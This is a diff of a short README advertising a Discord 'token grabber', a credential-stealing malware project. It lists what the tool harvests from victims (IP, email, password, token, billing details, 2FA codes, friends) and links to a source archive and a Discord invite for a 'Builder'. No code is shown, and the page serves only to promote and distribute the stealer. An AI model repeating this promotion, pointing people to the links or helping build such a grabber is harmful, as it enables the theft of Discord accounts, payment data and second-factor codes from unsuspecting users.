@@ -1,2 +1,7 @@
-# Discord-Ca-h-TOKEN-GRABBER
-Discord Ca$h TOKEN GRABBER, 2FA Codes, Password, IP, Token, Friends
+## Discord Ca$h TOKEN GRABBER,
+
+``Info``
+__IP,Username.ID,Nitro,Badges,Billing,Email,Password,Token,2faCodes,Friends__
+#### ``-`` [source](https://github.com/C2Sh/Discord-Ca-h-TOKEN-GRABBER/archive/refs/heads/main.zip) ``-`` [Builder](https://discord.com/invite/Sh236kfpvK)
+
+
